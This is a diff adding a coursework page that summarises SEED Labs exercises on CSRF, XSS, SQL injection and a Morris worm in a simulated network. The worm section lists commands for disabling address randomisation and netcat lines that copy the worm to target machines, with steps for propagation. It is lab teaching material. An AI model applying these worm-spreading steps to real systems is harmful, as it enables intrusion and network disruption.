@@ -86,8 +86,327 @@
                 <div class="position-relative d-flex align-items-center justify-content-center" style="margin-bottom: 2cm;">
                     <h1 class="position-absolute text-uppercase" style="color: black;">SEED-LABS Attacks</h1>
                 </div>
+				<div>
+					<h2>List of Attacks</h2>
+					<ul style="color: blue;">
+						<li><a href="#csrf">Cross-site Request Forgery(CSRF) Attack</a></li>
+						<li><a href="#xss">Cross-site Scripting(XSS) Attack</a></li>
+						<li><a href="#sql">SQL Injection Attack</a></li>
+						<li><a href="#morris">Morris Worm Attack</a></li>
+					</ul>
+				</div>
+				<br/>
+				<div id="csrf">
+					<h2>Cross-site Request Forgery(CSRF) Attack</h2>
+					<ul>
+						<li>Defintion</li>
+						<p>	CSRF stands for cross-site request forgery. Also known as session riding or XSRF. Forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated.
+						</p>
+						<li>
+							Workflow
+						</li>
+						<p>
+							<br/><img src="img/assignments/seed_lab_attacks/csrf.png" style="width: 41vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<i>Image source: https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/</i>
+						</p>
+						<li>Task-1: Observing HTTP Request</li>
+						<p>
+							<ul>
+								<li>How a legitimate HTTP request looks like and what parameters it uses, etc.</li>
+								<li>Using a Firefox add-on called "HTTP Header Live" for this purpose.</li>
+								<li>Identifying the parameters used in this these requests that we may need.</li>
+							</ul>
+						</p>
+						<li>Task-2: CSRF Attack using GET Request</li>
+						<p>
+							Samy wants to become a friend to Alice, but Alice refuses to add him to her Elgg friend list. Samy decides to use the CSRF attack to achieve his goal.
+							He sends Alice an URL (via an email or a posting in Elgg). Alice, curious about it, clicks on the URL, which leads her to Samy’s web site.
+							As soon as Alice visits the web page, Samy is added to the friend list of Alice.
+						</p>
+						<li>Task-3: CSRF Attack using POST Request</li>
+						<p>Samy wants Alice to say “Samy is my Hero” in her profile, so everybody knows about that.
+							Alice does not like Samy, let alone putting that statement in her profile.
+							Samy plans to use a CSRF attack to achieve that goal.							
+						</p>
+						<li>Task-4: Enabling Elgg’s Countermeasure</li>
+						<p>To defend against CSRF attacks, web applications can embed a secret token in their pages. All the requests coming from these pages must carry this token, or they will be considered as a cross-site request, and will not have the same privilege as the same-site requests. Attacker will not be able to get this secret token, so their requests are easily identified as cross-site requests. 
+							Elgg uses this secret-token approach as its built-in countermeasures to defend against CSRF attacks.
+							Task is to turn on the countermeasure.													
+						</p>
+						<li>
+							Demonstration
+						</li>
+						<a href="https://drive.google.com/file/d/14Q5kwEPFrSZTO6SuIK92sDjxtKcoW4sx/view?usp=sharing"><u style="color: blue;">Watch it on Google Drive!</u></a>
+					</ul>
+				</div>
+				<br/>
+				<div id="xss">
+					<h2>Cross-site Scripting(XSS) Attack</h2>
+					<ul>
+						<li>Defintion</li>
+						<p>XSS stands for Cross-site scripting. A computer security vulnerability typically found in web applications      
+							that enables malicious attackers to inject client side script into web pages viewed by other.
+							An attacker does not target a victim directly. Instead, an attacker would exploit a vulnerability within a website or web application that the victim would visit, 
+							essentially using the vulnerable website as a vehicle to deliver a malicious script to the victim’s browser.
+						</p>
+						<li>
+							Workflow
+						</li>
+						<p>
+							<br/><img src="img/assignments/seed_lab_attacks/xss.png" style="width: 41vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<i>Image source: https://vitalflux.com/angular-prevent-xss-attacks-code-examples/</i>
+						</p>
+						<li>Task-1: Posting a Malicious Message to Display an Alert Window</li>
+						<p>The objective of this task is to embed a JavaScript program in an Elgg profile, such that when another user views that profile, 
+							the JavaScript program will be executed and an alert window will be displayed.
+						</p>
+						<li>Task-2: Posting a Malicious Message to Display Cookies</li>
+						<p>
+							The objective of this task is to embed a JavaScript program in an Elgg profile, such that when another user views that profile, the user’s cookies will be displayed in the alert window.
+						</p>
+						<li>Task-3: Stealing Cookies from the Victim’s Machine</li>
+						<p>
+							In the previous task, the malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker.
+							In this task, the attacker wants the JavaScript code to send the cookies to himself/herself. 
+							To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.
+						</p>
+						<li>Task-4: Becoming the Victim’s Friend </li>
+						<p>We have to write an XSS worm that adds Samy as a friend to any other user that visits Samy’s page. This worm does not self-propagate.
+							In this task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim’s browser, without the intervention of the attacker. The objective of the attack is to add Samy as a friend to the victim.																			
+						</p>
+						<li>Task-5: Modifying the Victim’s Profile</li>
+						<p>The objective of this task is to modify the victim’s profile when the victim visits Samy’s page.
+							Specifically, modify the victim’s "About Me" field. We have to write an XSS worm to complete the task. This worm does not self-propagate.							
+						</p>
+						<li>
+							Demonstration
+						</li>
+						<a href="https://drive.google.com/file/d/1wOZ0ZTsdROTk1BC3VAbj8UxfbebhfYfX/view?usp=drive_link"><u style="color: blue;">Watch it on Google Drive!</u></a>
+					</ul>
+				</div>
+				<br/>
+				<div id="sql">
+					<h2>SQL Injection Attack
+					</h2>
+					<ul>
+						<li>Defintion</li>
+						<p>SQL injection is a code injection technique that exploits the vulnerabilities in the interface between web applications and database servers.
+						The vulnerability is present when user’s inputs are not correctly checked within the web applications before being sent to the back-end database servers	
+						</p>
+						<li>
+							Workflow
+						</li>
+						<p>
+							<br/><img src="img/assignments/seed_lab_attacks/sql.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<i>Image source: https://www.business2community.com/cybersecurity/sql-injection-attacks-sqli-web-based-application-security-part-4-02223254</i>
+						</p>
+						<li>Task-1: Get Familiar with SQL Statements</li>
+						<p>The objective of this task is to get familiar with SQL commands by playing with the provided database.
+							Print out all the tables of the selected database.
+							Use a SQL command to print all the profile information of the employee Alice.							
+						</p>
+						<li>Task-2: SQL Injection Attack on SELECT Statement </li>
+						<ul>
+							<li>Task 2.1: SQL Injection Attack from webpage.</li>
+							<p>Log into the web application as the administrator from the login page without knowing password.
+							</p>
+							<li>Task 2.2: SQL Injection Attack from command line.
+							</li>
+							<p>
+								Same as task 2.1 but from command line
+							</p>
+							<li>Append a new SQL statement.</li>
+							<p>
+								Modify the database using the same vulnerability in the login page.
+								There is a countermeasure preventing you from running two SQL statements in this attack.
+							</p>
+						</ul>
+						<li>Task-3: SQL Injection Attack on UPDATE Statement
+						</li>
+						<p>
+							If a SQL injection vulnerability happens to an UPDATE statement, the damage will be more severe, because attackers can use the vulnerability to modify databases.
+						</p>
+						<ul>
+							<li>Task 3.1: Modify your own salary.</li>
+							<li>Task 3.2: Modify other people’ salary</li>
+							<li>Task 3.3: Modify other people’ password.</li>
+						</ul>
+						<li>Task-4: Countermeasure — Prepared Statemen </li>
+						<p>Prepared statement comes into the picture after the compilation but before the execution step. 
+							A prepared statement will go through the compilation step, and be turned into a pre-compiled query with empty placeholders for data. 
+							To run this pre-compiled query, data need to be provided, but these data will not go through the compilation step; instead, they are plugged directly into the pre-compiled query, and are sent to the execution engine. 
+							Therefore, even if there is SQL code inside the data, without going through the compilation step, the code will be simply treated as part of data, without any special meaning. 
+							This is how prepared statement prevents SQL injection attacks.	
+						</p>
+						<li>
+							Demonstration
+						</li>
+						<a href="https://drive.google.com/file/d/149gN4xQ7UMI2wZIdD0Uvzv44KcRCBr_3/view?usp=drive_link"><u style="color: blue;">Watch it on Google Drive!</u></a>
+					</ul>
+				</div>
+				<br/>
+				<div id="morris">
+					<h2>Morris Worm Attack
+					</h2>
+					<ul>
+						<!-- <li>Defintion</li>
+						<p>
+						</p> -->
+						<li>
+							Assignment Setup
+						</li>
+							<ol>
+								<li>At first, going to Labsetup/internet-nano folder.</li>
+								<li>Opening a terminal and use ‘dcbuild’ to build and 
+									‘dcup’ to start
+									</li>
+								<li>Then, going to Labsetup/map folder.
+								</li>
+								<li>Opening a terminal and use ‘dcbuild’ to build and 
+									‘dcup’ to start. Both terminals are kept running.
+								</li>
+								<li>At last, to visualize the nano internet network, 
+									pointing browser to “http://localhost:8080 
+									/map.html”</li>
+									
+								</ol>
+								Finally, for checking if we type "ping 1.2.3.4" on one of 
+								the host’s terminal and type “icmp and dst 1.2.3.4” in 
+								the filter box of the Map, the machine running the ping 
+								command will flash.
+								<br/><img src="img/assignments/seed_lab_attacks/morris-1.png" style="width: 45vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
 
+								<li>Task 1: Attack Any Target 
+									Machine</li>
+						<p>In this task, we focus on the attacking part of the 
+							worm. For the sake of simplicity, we will only exploit 
+							the buffer-overflow vulnerability. To accomplish this:						
+						</p>
+						<ol>
+							<li>At first, turning off the address randomization
+								using command ‘sudo /sbin/sysctl -w 
+								kernel.randomize_va_space=0’</li>
+							<li>Then, the return address (ret) and offset are 
+								changed in the ‘worm.py’ file to generate the 
+								malicious payload for the buffer-overflow attack.
+								We have found the frame pointer by sending a 
+								benign message to the target server.
+								Note: worm.py file is located at Labsetup/worm 
+								folder.</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-2.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>Then, going to Labsetup/worm folder.
+							</li>
+							<li>Opening a terminal and use ‘chmod +x worm.py’
+								and ‘. /worm.py’ to run the file.</li>
+							<li>.After successful buffer overflow attack, “echo’(ˆ_ˆ)
+								Shellcode is running (ˆ_ˆ)’” is printed in the 
+								“internet-nano” terminal which was kept opening.</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-3.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+						</ol>
 
+						<li>Task 2: Self Duplication </li>
+						<p>
+							In this task, we need to transfer worm.py to the target 
+							machine at the time of Buffer Overflow attack. To 
+							accomplish this:
+						</p>
+						<ol>
+							<li>First, we have used our attacker machine as client 
+								and target machine as server. Target machine 
+								(server) will be listening to the port 7070 and 
+								attacker machine (client) will send the file 
+								worm.py.</li>
+							<li>We have added “nc -lnv 7070 > worm.py” in the 
+								shellcode so that target machine can get the file.	
+								<br/><img src="img/assignments/seed_lab_attacks/morris-4.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>							
+							</li>
+							<li>Then, we have added “cat worm.py | nc -w5 
+								{targetIP} 7070” statement using subprocess in 
+								the while loop.</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-5.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>Next, we have run the worm.py.</li>
+							<li>At last, we have checked the victim’s console 
+								(from the Map) whether worm.py has been 
+								created or not.</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-6.png" style="width: 31vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+						</ol>
+						<li>Task 3: Propagation
+						</li>
+						<p>
+							In this task, we need to we need to make changes to 
+							worm.py so the worm can continue crawling after it 
+							arrives on a newly compromised machine. To 
+							accomplish this:
+						</p>
+						<ol>
+							<li>First of all, we have modified the getNextTarget() 
+								function so that we can generate the IP address 
+								for the next target randomly.</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-7.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>Next in the while loop, we have checked whether 
+								the next target machine is alive or not.
+								</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-8.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>Then, we have modified our shellcode so the 
+								worm can continue crawling from one machine to 
+								another.</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-9.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>.Next, we have run worm.py and kept eyes on 
+								“internet-nano” server whether worm is crawling 
+								or not.
+								</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-10.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>At last, we have used the ‘htop’ command to 
+								observe the resource usages. Because, Once the 
+								CPU usage hits 100 percent, we need to shut down 
+								the nano internet (using ‘dcdown’). Otherwise, if 
+								waiting too long may freeze VM (i.e., successfully 
+								brought down the internet).
+								</li>
+								<br/><img src="img/assignments/seed_lab_attacks/morris-11.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+						</ol>
+						<li>Task 4: Preventing Self 
+							Infection
+							</li>
+						<p>In this task, we need to we need to add such a checking 
+							mechanism to the worm code to ensure that one 
+							instance of the worm can run on a compromised 
+							computer. Besides, the worm file should not be 
+							created more than once in a victim machine. To 
+							accomplish this:	
+						</p>
+						<ol>
+							<li>First, we have modified shellcode with a condition 
+								whether there already exists any worm.py. If so, 
+								then the machine will be skipped.
+								</li>
+							<br/><img src="img/assignments/seed_lab_attacks/morris-12.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>Then to ensure that one instance of the worm can 
+								run on a compromised computer, we have created
+								another file named “myWorm.py” which is used 
+								for initial attack. The difference between 
+								‘worm.py’ and ‘myWorm.py’ is that former has 
+								extra line ‘exit (0)’ which means that this worm.py 
+								will run only at once. 
+								Note: Our program sends ‘worm.py’ to the target 
+								machine, not ‘myWorm.py’. </li>
+							<br/><img src="img/assignments/seed_lab_attacks/morris-13.png" style="width: 21vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+							<li>At last, we have used the ‘htop’ command to 
+								observe the resource usages. This time, the CPU 
+								does not reach 100 percent.
+								</li>
+							<br/><img src="img/assignments/seed_lab_attacks/morris-14.png" style="width: 27vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+						</ol>
+						<li>Visualization of attack in Map</li>
+						<p>
+							As “ping 1.2.3.4” was given in the code, we can 
+							visualize the infected machines using “icmp and dst 
+							1.2.3.4” in the filter box. The infected machines are 
+							flashing in the map.
+						</p>
+						<br/><img src="img/assignments/seed_lab_attacks/morris-15.png" style="width: 45vw; min-width: 330px; margin-left: auto; margin-right: auto; display: block; margin-left: auto; margin-right: auto; display: block;" class="rounded" alt=""><br/>
+					</ul>
+				</div>
         </div>      
     </div>
 </section>
